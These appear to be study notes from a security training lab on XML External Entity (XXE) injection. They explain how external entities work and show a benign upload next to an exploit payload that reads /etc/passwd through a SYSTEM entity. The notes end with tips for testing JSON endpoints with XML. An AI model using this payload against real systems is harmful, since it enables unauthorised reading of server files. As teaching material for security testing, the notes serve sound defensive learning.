## XXE - External Entities Injection
### Introduction
- Some apps use XML to tranfer data
- XML: Extensible Markup Language
- Format has potentially dangerous features
- Parsers that process the data and pass it on can be vulnerable
- XXE Injecton: XML eXternal Entity Injection
- XML Entity: A simple way of presenting data or special characters
- An external entity is a custom entity defined outside the document
- It needs to be located when the XML file is passed
- Can be abused to read files or execute code

### Lab
- Access the first XXE lab
- Simulates an internal system that allows an administrator to bulk update the information of their users across a system
- Allows uploading XML
- Upload the xxe safe file

  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <creds>
      <user>testuser</user>
      <password>testpass</password>
  </creds>
  ```
- Apps shows it was uploaded and parsed successfuly, showing the output

  ![image](https://github.com/user-attachments/assets/a7a6e67e-c9f6-4a5a-8c84-89f880d58329)

- Upload the XXE exploit file

  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE creds [
  <!ELEMENT creds ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <creds><user>&xxe;</user><password>pass</password></creds>
  ```
- App executed the command

  ![image](https://github.com/user-attachments/assets/5441ad68-1fc8-4fb5-8406-c33831a72c53)

- Not common, teams use patched or secure passes
- Still worth testing
- Should test API endpoints expecting JSON by sending XML data
















